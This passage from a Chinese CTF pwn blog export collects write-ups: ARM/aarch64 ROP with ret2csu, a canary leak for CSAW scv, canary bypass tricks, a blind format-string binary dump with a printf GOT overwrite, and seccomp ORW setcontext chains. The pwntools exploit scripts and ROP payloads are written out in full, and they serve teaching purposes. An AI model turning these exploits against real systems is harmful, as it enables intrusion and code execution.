|\n+-------------+\n```\n\n虽然FP中的内容实际上是LR的内容,但其实也差不多，反正最后返回时都会发生SP移动，先取FP，再取对应的PC，所以实际怎么样也无所谓了：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191437383.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191437497.png)\n\n这样就相当于常规的32位栈模型ebp-eip了，只不过不涉及参数，一般需要用gadget来为对应参数赋值。\n\n在常规栈溢出时，这里发挥重要作用的就是gadgets_addr了，一般可以先ROPgadget --binary ./pwn --only \"pop\"，查找对应的pop gadget。例如这里可以有pop {r0, r4, pc}，那么完成利用的栈模型就如下：\n\n```\n#注释头\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  padding    | <- frame pointer\n+-------------+\n|gadgets_addr | <- return address\n+-------------+\n|binsh_addr   |\n+-------------+\n|junk_data    |\n+-------------+\n|system_addr  |\n+-------------+\n```\n\n将binsh_addr赋值给r0，junk_data赋值给r4，system_addr赋值给pc，完成利用。\n\n★在栈溢出探索padding时，可以用pwndbg中的cyclic 200自动生成200个字符，然后输入，那么在arm(32位)架构下的非叶子函数中，一定会给pc赋值为我们的某个padding，这时候程序断下来，可以查看pc的值，用cyclic -l [PC值]来查找溢出点。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438678.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438837.png)\n\n▲所以这里如果针对非叶子函数劫持了FP和FP+4，那么就相当于劫持栈并且控制程序流了，如果想调用函数还需要设置参数寄存器r0-r3才行。\n\n简单的可以直接查找pop r0,pc之类的：ROPgadget --binary ./pwn --only \"pop\"，这种方式一般只能调用一个参数的函数。\n\n泄露地址之类的一般还是需要用到ret2csu，arm(32位)下的ret2csu一般是用到：\n\n```\n#注释头\n\n.text:0001049C                 LDR     R3, [R5],#4                 ②\n.text:000104A0                 MOV     R2, R9\n.text:000104A4                 MOV     R1, R8\n.text:000104A8                 MOV     R0, R7\n.text:000104AC                 BLX     R3                          ③\n.text:000104B0                 CMP     R6, R4\n.text:000104B4                 BNE     loc_10498\n.text:000104B8                 LDMFD   SP!, {R4-R10,PC}            ①\n```\n\n即通过①来为R4-R10赋值，以及控制PC跳转到②，再利用R5地址对应的值来赋值给R3对应跳转，期间也可通过R7-R8来控制R0-R2的参数。这里需要满足R5处保存的是got表地址，即将R5赋值为func_got_addr即可。\n\n \n\n四、aarch64架构的函数分类：其实就是ARM的64位版本，除了寄存器方面变化挺大，其他的调用方式什么的也差不了太多。\n\n1.叶子函数：不做任何其他函数调用的函数\n\n调用时的栈状态分析：和正常的arm差不多，FP入栈，sub sp开辟栈空间。最后通过Add sp,sp,#20和ret来返回。Ret相当于mov PC,LR。将LR中保存的地址给PC来执行。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438918.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438088.png)\n\n也同样通过栈劫持来控制。\n\n2.非叶子函数：也差不多，但有些不同的是，进入函数后，会先开辟栈空间，先压入LR然后压入FP。stp  x29, x30, [sp, #-0x30]!即非叶子函数栈中的FP和LR都保存在栈顶，最后通过LDP X29, X30, [SP+0x30+var_30]加上RET来返回。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438694.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439144.png)\n\n可以看到进入非叶子函数中之后，先开辟栈空间，然后压入LR，再压入FP，栈模型如下：\n\n```\n#注释头\n\n+-------------+\n| Last FP     | <- SP\n+-------------+\n| LR          |\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|Last Last FP | <- frame pointer\n+-------------+\n|Last LR      | <- return address\n+-------------+\n|binsh_addr   |\n+-------------+\n|junk_data    |\n+-------------+\n|system_addr  |\n+-------------+\n```\n\npaddint以下的部分才是我们要劫持的。\n\n所以我们在该函数中的栈溢出劫持的其实不是该函数的返回地址，而是上一个函数的返回，所以这里同时也需要确保上一个函数中汇编代码剩下的操作不会对我们覆盖的栈上的值进行重要改写，不然栈上的数据就容易被破坏。\n\n其次需要注意的是aarch64下的gadget搜索，用到：\n\nROPgadget --binary ./pwn --only \"ldp|ret\"\n\n其实是一样的，ldp就类似pop，反正gadget运用算是更加灵活了。\n\n▲通常也可以用ret2csu来搞定：\n\n```\n#注释头\n\n.text:00000000004008AC             LDR             X3, [X21,X19,LSL#3]     ②\n.text:00000000004008B0             MOV             X2, X22\n.text:00000000004008B4             MOV             X1, X23\n.text:00000000004008B8             MOV             W0, W24\n.text:00000000004008BC             ADD             X19, X19, #1\n.text:00000000004008C0             BLR             X3                      ③\n.text:00000000004008C4             CMP             X19, X20\n.text:00000000004008C8             B.NE            loc_4008AC\n.text:00000000004008CC\n.text:00000000004008CC loc_4008CC   \n.text:00000000004008CC             LDP             X19, X20, [SP,#var_s10] ①\n.text:00000000004008D0             LDP             X21, X22, [SP,#var_s20]\n.text:00000000004008D4             LDP             X23, X24, [SP,#var_s30]\n.text:00000000004008D8             LDP             X29, X30, [SP+var_s0],#0x40\n.text:00000000004008DC             RET\n```\n\n▲例如该SP即为0x40007ffe40：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439928.png)\n\n一直到0x40007ffe90为FP，那么如下\n\n```\n#注释头\n\n0x616161…         <-FP\n0x4008cc          <-LR\n```\n\n跳转0x4008CC(u_gadget1)之后，SP为0x40007ffea0依次赋值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439548.png)\n\n再通过LDP  X29, X30, [SP+var_s0],#0x40和ret跳转到0x4008ac(u_gadget2)最终实现X0~X3赋值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439293.png)\n\n最终跳转函数真实地址0x400090f9c8，即需要给X21赋值为read_got_addr，参数依次为read(0,0x411010,0x8)。同时需要注意的是，在read完成之后，还是会回到当前的万能gadget处0x4008C4，再接着运行下去。然后一路运行下去，经过万能gadget中的RET返回到之前设置的0x40007ffee8处也就是0x400824，这个也是在最开始就设置好的，通常可以用来返回到read函数或者main函数处再执行栈溢出，之后就正常操控程序。\n\n▲脚本示例：\n\n```python\ndef aarch64_csu(call, x0, x1, x2,ret_addr):\n    payload = p64(u_gadget1)\n    payload += \"A\"*0x8\n    payload += p64(u_gadget2)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(call)          #got_addr\n    payload += p64(x2)\n    payload += p64(x1)\n    payload += p64(x0)\n    payload += \"B\"*0x8\n    payload += p64(ret_addr)\n    return payload\n\npayload = flat(cyclic(72)\npayload += aarch64_csu(elf.got['read'], 0, bss_addr, 8,ret_addr))\n```\n\n这个是没有栈劫持的。Aarch64的csu也不怎么用到，因为aarch64的csu赋值不是pop，SP基本不会动，而且大多时候都是SP寻址。\n\n \n\n参考资料：\n\nhttps://www.anquanke.com/post/id/199112#h3-23\n","tags":["ARM-Knowledge"],"categories":["ARM"]},{"title":"CSAW Quals CTF 2017-scv","url":"/2021/08/19/CSAW Quals CTF 2017-scv/","content":"\n1.常规checksec，开启了NX和Canary。打开IDA发现程序两个漏洞：\n\n(1)功能1中栈溢出：\n\n```\n#注释头\n\nchar buf; // [rsp+10h] [rbp-B0h]\n--------------------------------------\nv25 = read(0, &buf, 0xF8uLL);\n```\n\n(2)功能2中输出字符串：puts(&buf);\n\n注：这里的put和printf不是同一个概念，不是格式化字符串的函数。但是由于put是直接输出我们的输入，而我们的输入被保存在main函数栈上，所以可以输入足够多的数据连上canary，利用put一并打印出来，从而把canary泄露出来。\n\n2.调试，IDA中观察位置，计算偏移，可以知道偏移为0xB0-0x8=0xA8=168个字符，(canary通常被放在rbp-0x08的位置处，当然也不一定，最好还是调试一下)这样就可以构造第一个payload:payload1 = ”A”*168 + “B”。\n\n这里再加一个B是因为canary的保护机制，一般情况下canary的最后两位也就是最后一个字符都是\\x00，由于是大端序，所以可以防止不小心把canary泄露出来。因为上一个栈内存的最后第一个字符连接的是下一个栈内存的第一个字符，也就是canary中的\\x00，而打印函数默认00是字符串的结尾，所以这里如果输入”A”*168，那么打印出来的就只会是168个A，不会将canary带出来。所以我们再加一个B，覆盖掉canary在占内存的第一个字符00，从而能够连接上成为一个完整的字符串打印出来。但又由于是大端序，泄露出来的canary应该最后一个字符是B，对应\\x42，这里需要修改成\\x00从而获得正确的canary。同理，如果随机化的canary中含有\\x00，那么仍然会导致字符串截断，无法得到正确的canary。所以其实如果多执行几次，碰到包含\\x00的canary，就会导致程序出错。\n\n泄露加修改：canary = u64('\\x00'+io.recv(7))\n\n3.之后就可以利用canary的值和栈溢出，调用put函数打印其它函数的实际地址。这里程序使用了read函数，并且同时外部调用了read函数，可以通过输入read的.got表的值，使其打印read函数的真实地址。同时需要注意的是，由于是64位程序，传参是从rdi开始，所以栈溢出的第一个返回地址应该给rdi赋值才对，编写payload1。\n\n```\n#注释头\n\npayload1 = \"\"\npayload1 += \"A\"*168 #padding\npayload1 += p64(canary) #在canary应该在的位置上写canary\npayload1 += \"B\"*8 #这一段实际上是rbp的位置\npayload1 += p64(pop_rdi)   \n#跳转到pop rdi;retn;所在语句(可以通过ROPgadget查询)，来给rdi传入read函数的got表中的地址。\npayload1 += p64(read_got) #被pop rdi语句调用，出栈\npayload1 += p64(puts_plt)\n#retn到put函数的plt表，调用put函数。\npayload1 += p64(start)\n#调用之后，返回程序最开始，恢复栈帧，再执行一遍程序\n```\n\n这样就可以得到read的实际地址，从而通过libc库计算偏移地址得到基地址。\n\n5.现在有了libc库的基地址，观察main函数退出时的汇编代码：mov   eax, 0可以使用在2.24libc库条件下可以使用onegadget。\n\n6.直接计算onegadget偏移，然后覆盖main函数的返回地址，getshell。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["canary"],"categories":["PWN","canary绕过0x9"]},{"title":"Canary绕过总结","url":"/2021/08/19/Canary绕过总结/","content":"\n1.有循环时，32或者64位程序下都可以逐字节爆破绕过。\n\n2.可通过printf字符串漏洞来泄露(%p.%p.%p....)。\n\n3.通过打印栈上数据的打印函数栈溢出连上canary泄露出来。\n\n4.当程序直接读取flag进入内存时，利用函数__stack_chk_fail，加上足够长度的栈溢出覆盖argv[0]为程序中保存flag的地址。这样当__stack_chk_fail运行时就会打印出argv[0]中地址上对应的内容，也就是flag。有时候需要设置远程环境变量LIBC_FATAL_STDERR_=1，将flag打印在本地。\n\n5.由pthread出来的线程函数中如果有足够长度的栈溢出，可以直接覆盖canary来源tcbhead_t结构体中的canary和栈中的canary为同一数值，这样检查仍旧通过。\n\n(64位中为fs:[28h]，32位中为gs:[14h])\n\n▲查找方法：\n\n(1)pwndbg>catch syscall 158\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520600.jpeg)\n\n(2)查看rsi寄存器，里面存的内容就是tcbhead_t结构体的首地址。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520328.jpeg)\n\n(3)之后就可以查看canary的值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520551.jpeg)\n\n但是这个方法好像不怎么顶用了，libc2.23及以下都行，但是libc2.27就会出现无法访问的错误，具体的原因好像是libc升级之后添加了什么东西设置了不可访问：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520546.jpeg)\n\n32位下没有arch_prctl这个系统调用了，需要看canary的生成函数调用了什么系统调用，方法类似，下断点之后查出来。\n\n★IDA中远程调试也可以查出来，利用程序开头的fs:28，找到地址，然后减去libc基地址就可以得到偏移。但是需要libc一致，偏移才会一致。而且这个偏移并不是在libc数据段上，只是程序初始化时放在后面的，所以不同的程序不同的libc都会导致偏移不一样，需要具体调试。\n\n▲长度一般为rbp+2000左右，不同的Libc版本都不太一样，需要调试才能知道。原因是通过pthread出来的线程函数栈会被安置到与TLS相差约2000字节的距离处：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520195.png)    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520726.png)\n\n这里可以看到，第一个是main函数栈，第二个是在main函数中通过pthread进程创建并且调用的函数栈，两者相差将近0x700000000这么远，完全不是正常的函数调用相差的栈距离。同时在该函数中rbp指向的始终是0000(全是)，该函数结束后会先跳转到libc中的libpthread来恢复栈。\n\n```\n#注释头\n\n▲64位的tcbhead_t结构体：\ntypedef struct\n{\n  void *tcb;        /* Pointer to the TCB.  Not necessarily the\n               thread descriptor used by libpthread.  */\n  dtv_t *dtv;\n  void *self;       /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;//即为canary，fs:28h处\n  uintptr_t pointer_guard;\n  ...\n} tcbhead_t;\n```\n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN","canary绕过0x9"]},{"title":"Hello_World","url":"/2021/08/19/Hello_World/","content":"\n1.很简单的一个程序，IDA打开，32位程序，main函数-hello函数中\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556311.jpeg)\n\n```\n#注释头\n\nint buf; // [esp+6h] [ebp-12h]\nread(0, &buf, 0x64u);\n```\n\nbuf距离栈底有0x12h，而可以读入的数据有0x64h，所以可以栈溢出。\n\n2.checksec一下，开了NX，不能shellcode，这里也不需要，因为我们的输入并不会被当成指令来执行。\n\n3.程序中自带后门getShell函数，并且有栈溢出，那么直接覆盖hello函数的返回地址跳转即可。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556319.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556326.jpeg)\n\n4.编写payload:\n\npayload = \"a\"*(0x12+0x04)  #padding\n\n(其中0x12是覆盖掉距离栈底的内容，0x04是覆盖掉hello函数返回的ebp，之后才是覆盖hello函数的返回地址)\n\npayload += p32(0x0804846B)  ##覆盖返回地址\n\n5.之后输入，然后Interactive()即可。\n\n \n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["First"],"categories":["PWN","StackOverflow0x1"]},{"title":"NJCTF2017_pingme","url":"/2021/08/19/NJCTF2017_pingme/","content":"\n1.搭建题目：socat tcp-listen:10001,fork exec:./pingme,reuseaddr &\n\n2.题目不给文件，只有地址和端口，可能是BROP也可能是格式化字符串盲打。连接上先尝试格式化字符串盲打，输入多个%p.%p.%p，可以看到泄露出了数据，那么就应该是格式化字符串盲打。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518475.jpeg)\n\n3.首先利用爆破找到我们输入的参数偏移：\n\n```\n#注释头\n\nfrom pwn import*\nio = remote(\"127.0.0.1\",10001)\n#io = process(\"./pingme\")\n\ndef exec_fmt(payload):\n    io.sendline(payload)\n    info = p.recv()\n    return info\n\nauto = FmtStr(exec_fmt)\noffset = auto.offset\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518534.jpeg)\n\n偏移为7，验证一下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518484.jpeg)\n\n4.利用格式化字符串漏洞将二进制文件dump下来：\n\n```\n#注释头\n\nfrom pwn import*\n\ndef dump_memory(start_addr,end_addr):\n    result = \"\"\n    while start_addr < end_addr:\n        io = remote('127.0.0.1',10001)\n        io.recvline()\n        payload = \"%9$s.AAA\" + p32(start_addr)\n        io.sendline(payload)\n        data = io.recvuntil(\".AAA\")[:-4]\n        if data == \"\":\n            data = \"\\x00\"\n        log.info(\"leaking: 0x%x --> %s\"%(start_addr,data.encode('hex')))\n        result += data\n        start_addr += len(data)\n        io.close()\n    return result\nstart_addr = 0x8048000\nend_addr = 0x8049000\ncode_bin = dump_memory(start_addr,end_addr)\nwith open(\"code.bin\",\"wb\") as f:\n    f.write(code_bin)\n    f.close()\n```\n\n(1)由于是格式化字符串打印，会打印到字符串结尾\"\\x00\"，但是不会打印出\"\\x00\"，所以需要补上\"\\x00\"。\n\n(2)这里的%9$s.AAA中偏移为9，是因为打印的是p32(start_addr)处的内容，前面有%9$s.AAA共八个字节，两个地址单位，所以偏移7+2=9。并且填充AAA也是为了满足地址对齐，同时作为特征点来获取程序传回来的数据。将地址放在后面也是为了防止地址中的\"\\x00\"造成截断。\n\n(3)dump的内容只需要有0x1000这么大就行，一个内存页即可。\n\n(4)没有开启PIE时，32位程序从0x8048000开始。\n\n▲搭建题目时，dump出来的内容可能会有点改变，没办法gdb调试，应该是libc版本或者ASLR的问题，不过不影响，IDA静态分析就好。\n\n5.之后就是常规的格式化字符串漏洞利用了，借助dump下来的文件，找到printf的got表地址，利用格式化字符串打印printf函数真实地址。之后通过DynELF或者LibcSearch来获取system函数在libc中的偏移，利用泄露的printf函数真实地址，得到Libc加载的基地址，再计算得到system函数的真实地址。最后再利用格式化字符串漏洞将system函数真实地址写到printf的got表处，劫持got表。最后再输入binsh字符串即可劫持printf(\"/bin/sh\")为system(\"/bin/sh\")。\n\n(1)泄露printf函数真实地址:\n\n```\n#注释头\n\ndef get_printf_addr():\n    io = remote('127.0.0.1', '10001')\n    io.recvline()\n    payload = \"%9$s.AAA\" + p32(printf_got)\n    io.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:4]\n    log.info(\"printf address: %s\" % data.encode('hex'))\n    return data\nprintf_addr = get_printf_addr()\n```\n\n(2)计算或者DynELF得到system函数真实地址system_addr。\n\n(3)利用格式化字符串漏洞进行attack\n\n```\npayload = fmtstr_payload(7, {printf_got:system_addr})\nio = remote('127.0.0.1', '10001')\nio.recvline()\nio.sendline(payload)\nio.recv()\nio.sendline('/bin/sh')\nio.interactive()\n```\n\n \n\n参考资料：\n\nhttps://www.dazhuanlan.com/2019/10/08/5d9c20226a067/\n\n \n","tags":["Blind"],"categories":["PWN","BlindFmstr"]},{"title":"ORW汇总","url":"/2021/08/19/ORW汇总/","content":"\n1.seccomp保护：\n\n(1)工具安装：\n\n```\n#注释头\n\nsudo apt install gcc ruby-dev\ngem install seccomp-tools\n```\n\n(2)查看保护：\n\nseccomp-tools dump ./pwn\n\n```\n#注释头\n\nroot@241adce81c0a:/ctf/CISCN/silverwolf# seccomp-tools dump ./silverwolf\nline CODE JT JF K\n=================================\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009\n0005: 0x15 0x02 0x00 0x00000000 if (A == read) goto 0008\n0006: 0x15 0x01 0x00 0x00000001 if (A == write) goto 0008\n0007: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0009\n0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0009: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n(3)解析：\n\n如上，如果架构不为ARCH_X86_64，则to 0009(kill)。系统调用号A为read,write，则to 0008，即ALLOW。同理看懂if语句就行，这里只能用read和write，照理说open也可以，但是这里好像不太行。\n\n2.setcontext不同版本：\n\n(1)2.29以前：劫持 free_hook 或者 malloc_hook写入 setcontext函数中的 gadget( setcontext+53)，通过 rdi索引，来设置相关寄存器：\n\n```\n#注释头\n\n<setcontext+53>: mov rsp,QWORD PTR [rdi+0xa0]\n<setcontext+60>: mov rbx,QWORD PTR [rdi+0x80]\n<setcontext+67>: mov rbp,QWORD PTR [rdi+0x78]\n<setcontext+71>: mov r12,QWORD PTR [rdi+0x48]\n<setcontext+75>: mov r13,QWORD PTR [rdi+0x50]\n<setcontext+79>: mov r14,QWORD PTR [rdi+0x58]\n<setcontext+83>: mov r15,QWORD PTR [rdi+0x60]\n<setcontext+87>: mov rcx,QWORD PTR [rdi+0xa8]\n<setcontext+94>: push rcx\n<setcontext+95>: mov rsi,QWORD PTR [rdi+0x70]\n<setcontext+99>: mov rdx,QWORD PTR [rdi+0x88]\n<setcontext+106>: mov rcx,QWORD PTR [rdi+0x98]\n<setcontext+113>: mov r8,QWORD PTR [rdi+0x28]\n<setcontext+117>: mov r9,QWORD PTR [rdi+0x30]\n<setcontext+121>: mov rdi,QWORD PTR [rdi+0x68]\n<setcontext+125>: xor eax,eax\n<setcontext+127>: ret\n```\n\n并执行提前布置好的 ORW ROP chains。\n\n△如果是free_hook则将对应要释放的堆块的内容改为ORW ROP chains即可。如果是malloc_hook，不太知道，应该也是在对应堆块改ORW ROP chains，但是需要这个堆块确实是这一次malloc出来的堆块吧。\n\n(2)2.29后 setcontext中的gadget变成了以 rdx索引，因此如果我们按照之前思路的话，需要通过 ROP控制 RDX的值，如下所示：\n\n```\n#注释头\n\n.text:00000000000580DD mov rsp, [rdx+0A0h]\n.text:00000000000580E4 mov rbx, [rdx+80h]\n.text:00000000000580EB mov rbp, [rdx+78h]\n.text:00000000000580EF mov r12, [rdx+48h]\n.text:00000000000580F3 mov r13, [rdx+50h]\n.text:00000000000580F7 mov r14, [rdx+58h]\n.text:00000000000580FB mov r15, [rdx+60h]\n.text:00000000000580FF test dword ptr fs:48h, 2\n....\n.text:00000000000581C6 mov rcx, [rdx+0A8h]\n.text:00000000000581CD push rcx\n.text:00000000000581CE mov rsi, [rdx+70h]\n.text:00000000000581D2 mov rdi, [rdx+68h]\n.text:00000000000581D6 mov rcx, [rdx+98h]\n.text:00000000000581DD mov r8, [rdx+28h]\n.text:00000000000581E1 mov r9, [rdx+30h]\n.text:00000000000581E5 mov rdx, [rdx+88h]\n.text:00000000000581EC xor eax, eax\n.text:00000000000581EE retn\n```\n\n这里好像赋值的索引好像有点变化，所以可能实际做题的时候需要变一下脚本。同时setcontext+53变成了setcontext+61然后由于rdx的gadget可能不是太好找，所以一般有以下几个好用的gadget：\n\n①getkeyserv_handle+576：\n\n```\n#注释头\n\nmov rdx, [rdi+8]\nmov [rsp+0C8h+var_C8], rax\ncall qword ptr [rdx+20h]\n```\n\n通过rdi控制rdx，同样2.29以后不同版本都不太一样，需要再调试看看，比如2.31里就是：\n\n```\n#注释头\n\nmov rdx,QWORD PTR [rdi+0x8]\nmov QWORD PTR [rsp],rax\ncall QWORD PTR [rdx+0x20]\n```\n\n②svcudp_reply+26:\n\n```\n#注释头\n\nmov rbp, qword ptr [rdi + 0x48]; \nmov rax, qword ptr [rbp + 0x18]; \nlea r13, [rbp + 0x10]; \nmov dword ptr [rbp + 0x10], 0; \nmov rdi, r13; \ncall qword ptr [rax + 0x28];\n```\n\n通过rdi控制rbp实现栈迁移，然后即可任意gadget了。\n\n其中2.31版本下还是一样的，如下：\n\n```\n#注释头\n\nmov rbp,QWORD PTR [rdi+0x48]\nmov rax,QWORD PTR [rbp+0x18]\nlea r13,[rbp+0x10]\nmov DWORD PTR [rbp+0x10],0x0\nmov rdi,r13\ncall QWORD PTR [rax+0x28]\n```\n\n③万能gadget，不知道为什么https://www.anquanke.com/post/id/236832#h3-10这篇文章没有提及到万能gadget，不过我觉得应该也能用，不过使用万能gadget的话一般还需要配合栈迁移才行。\n\n④通过environ泄露栈地址，并在栈上构造orw rop链。(libc的bss偏移，然后io_file)\n\n \n\n3.常用orw chains脚本：\n\n(1)利用open、write、read：\n\nCISCN-2021 silverwolf\n\n```\n#注释头\n\n#直接改__free_hook为setcontext+53\n#2.28 and down\n\nchunk_addr = heap_addr +0x2e0\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0\n\norw = \"a\"*0xa0\n\norw += p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\n2019-BALSN-CTF-plaintext\n\n```\n#注释头\n\n#2.29,需要将__free_hook设置为指定gadget，这里为__libc_cleanup_routine+7\nmov rdx, qword ptr [rdi + 8]\nmov rax, qword ptr [rdi]\nmov rdi, rdx\njmp rax\n#不同gadget脚本需要微调，只要满足赋值rdi并且之后跳转到setcontext即可\n#需要从\"a\"*0xa0中拿出0x10的空间用来设置setcontext,然后将rdx赋值为对应chunk地址\n\nchunk_addr = heap_addr +0x30a0\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0\n\n#这里setcontext+0x1d或53都可以，具体调试分析,但是61不行\n#即chunk_addr+0x8赋值为chunk_addr，chunk_addr赋值为setcontext+0x1d\norw = p64(libc_addr + libc.symbols['setcontext'] + 0x1d) + p64(chunk_addr) \norw += \"a\"*0x90\n\norw += p64(fake_rsp) + p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\nYCB easy_heap\n\n```\n#注释头 \n#2.31 \n#这里同样将free_hook设置为gadget，用到的是getkeyserv_handle+576： \nmov rdx, [rdi+8] \nmov [rsp+0C8h+var_C8], rax \ncall qword ptr [rdx+20h] \n\n#chunk_addr+8赋值为chunk_addr，chunk_addr+0x20赋值为setcontext+61\nchunk_addr = heap_addr +0x20\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0 \n\norw = \"a\"*0x08 + p64(chunk_addr) \norw += \"a\"*0x10 \norw += p64(libc_addr + libc.sym['setcontext'] + 61) + \"a\"*0x8\norw += \"a\"*0x70\n\norw += p64(fake_rsp) + p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\n▲同样可以用frame结构体来调用函数。\n","tags":["ORW-Skill"],"categories":["ORW"]},{"title":"NSCTF 2017-pwn2","url":"/2021/08/19/NSCTF 2017-pwn2/","content":"\n1.常规checksec，开启了NX和canary，IDA打开找漏洞，sub_80487FA()函数中存在两个漏洞：\n\n(1)格式化字符串漏洞：\n\n```\n#注释头\n\ns = (char *)malloc(0x40u);\nsub_804876D(&buf);\nsprintf(s, \"[*] Welcome to the game %s\", &buf);\nprintf(s)\n```\n\n(2)栈溢出漏洞：\n\n```\n#注释头\n\nread(0, &buf, 0x100u);\n```\n\n2.由于canary的关系，栈溢出没办法利用，但是这里可以通过格式化字符串漏洞直接泄露canary，之后再实际操作。这里为了学习爆破canary的方式，先用爆破的方式来获取canary。\n\n3.如果直接爆破canary，由于canary随机刷新，就算去掉最后一个字节\\x00，在32位条件下我们假定一个canary的值，那么canary随机生成为我们假定的值的概率应该为1/(2^24-1)所以从概率上讲应该需要爆破2^24-1次，也就是16,777,215-1次，而且还只是概率上的期望值，如果不考虑canary的实际生成机制，并且运气不好的话，可能无穷大，等爆出来黄花菜都凉了，这鬼能接受。所以一般使用爆破canary都需要一个fork子进程。\n\n4.子进程的崩溃并不会影响到父进程，并且由于子进程的数据都是从父进程复制过来的，canary也一样，只要父进程不结束，子进程无论崩溃多少次其初始化的数据还是父进程的数据，canary就不会发生改变，这样就为快速爆破canary创造了前提。刚好这个程序有fork一个子进程：\n\n(1)观察汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522904.png)\n\nmain函数主体中先call fork，由于函数的结果基本都是传给eax，所以这里的eax就代表fork的成功与否，返回ID代表fork成功，然后将调用结果赋值给局部变量[esp+1ch]，之后拿0与局部变量[esp+1ch]比较。这里涉及到JNZ影响的标志位ZF，CF等，不细介绍。总而言之就是会fork一个子进程，成功就跳转到我们之前说过的有漏洞的函数中，失败则等待，一会然后依据while重开程序。\n\n(2)观察伪代码也可以\n\n▲fork机制：\n\n1）在父进程中，fork返回新创建子进程的进程ID；\n\n2）在子进程中，fork返回0；\n\n3）如果出现错误，fork返回一个负值；\n\n5.爆破canary原理：\n\n(1)最开始我认为就算canary不变，那么从0*24开始尝试，一直到canary的值，那么需要尝试canary值这么多次，最少1次，最多2^24次，就算取期望，那也应该是(1/2)*(2^24)次。也没办法接受啊。\n\n(2)之后看了canary的检查机制和生成机制：在sub_80487FA汇编代码中：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522748.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522426.png)\n\n生成的时候是将栈上指定地方[ebp+var_C]给修改成canary。\n\n检查的时候，是从栈上取[ebp+var_C]的值传给eax和最开始随机生成的canary(large 